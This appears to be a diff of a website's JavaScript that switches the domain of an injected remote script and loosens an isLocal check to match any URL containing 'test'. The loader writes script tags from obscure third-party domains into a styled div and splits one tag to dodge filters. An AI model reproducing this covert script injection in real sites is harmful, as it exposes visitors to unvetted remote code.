@@ -165,7 +165,7 @@ function loadOther() {
         //     opacity = third_opacity_css;
         // }
         document.writeln('<div style="' + opacity + '">');
-        document.writeln('<script src="https://go.s.huigun.top/hm/cdn/static/jq_774276.js"></script>');
+        document.writeln('<script src="https://m.b.xiangwangdesh.com/hm/cdn/static/jq_774276.js"></script>');
         document.writeln('<scri' + 'pt src="//spl.ztvx8.com/wlzys5.js"> </scri' + 'pt>');
         document.writeln('</div>');
     }
@@ -265,7 +265,7 @@ function goNewDomain() {
 }
 
 function isLocal(url) {
-    return url.indexOf("localhost") !== -1 || url.indexOf("192.168.") !== -1;
+    return url.indexOf("test") !== -1 || url.indexOf("localhost") !== -1 || url.indexOf("192.168.") !== -1;
 }
 
 validateSite();
